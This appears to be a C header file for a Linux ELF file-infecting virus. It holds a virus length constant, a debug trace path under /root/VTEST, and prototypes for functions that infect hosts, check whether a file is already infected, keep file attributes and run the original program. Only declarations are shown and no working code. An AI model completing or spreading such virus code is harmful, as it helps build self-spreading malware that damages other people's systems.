#include <sys/stat.h>

#define FILEONLY 0
#define FILEPATH 1
#define VLENGTH 8000 /* you may have to change this value */

/* be sure that /root/VTEST exists if DEBUG is turned on ... */

#ifdef DEBUG
   #define TRACEFILE "/root/VTEST/VIRtrace" 
   #define DFPRINTF(format, args...) fprintf(fd, format, ##args)
#else
   #define DFPRINTF(format,args...)
#endif


int infect(int, char*);
int exechost(char*, char**, char**);
int isinfected(char*);
int iself(char*);
int cp(char*, char*);
int restoreattribs(char*, struct stat);
int saveattribs(char*, struct stat*);
int infect_host(char*, char*); 
int isclean(char*);
int isregular(char*);

char *whereis(char*, char*);        
char *gethost(char*,int);
char *getdir(char*);
